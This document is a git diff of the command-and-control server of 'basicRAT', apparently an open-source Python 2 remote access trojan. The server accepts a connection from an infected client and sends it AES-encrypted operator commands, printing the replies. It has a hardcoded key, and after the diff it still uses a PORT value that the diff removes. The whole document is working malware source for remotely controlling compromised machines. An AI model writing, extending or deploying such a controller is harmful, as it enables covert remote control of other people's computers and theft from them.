@@ -1,10 +1,9 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import base64
+import readline
 import socket
 import sys
-import time
 
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -16,9 +15,9 @@ except:
     sys.exit(1)
 
 HOST = 'localhost'
-PORT = 1337
-BS   = 16
 KEY  = '82e672ae054aa4de6f042c888111686a'
+# generate your own key with...
+# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
 
 
 def pad(s):
@@ -43,24 +42,28 @@ def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((HOST, PORT))
     s.listen(10)
-    
-    print 'basicRAT server listening on {}'.format(PORT)
-    
+    print 'basicRAT server listening on port {}...'.format(PORT)
+
     conn, _ = s.accept()
-    
+
     while True:
-        cmd = raw_input('> ').rstrip()
-        
-        if cmd == 'quit':
-            sys.exit(0)
-        
+        cmd = raw_input('basicRAT> ').rstrip()
+
+        # allow noop
+        if cmd == '':
+            continue
+
+        # send command to client
         conn.send(encrypt(cmd))
-        data = conn.recv(2048)
+
+        # stop server
+        if cmd == 'quit':
+            s.close()
+            sys.exit(0)
+
+        data = conn.recv(4096)
         print decrypt(data)
-    
-    s.close()
 
 
 if __name__ == '__main__':
     main()
-    
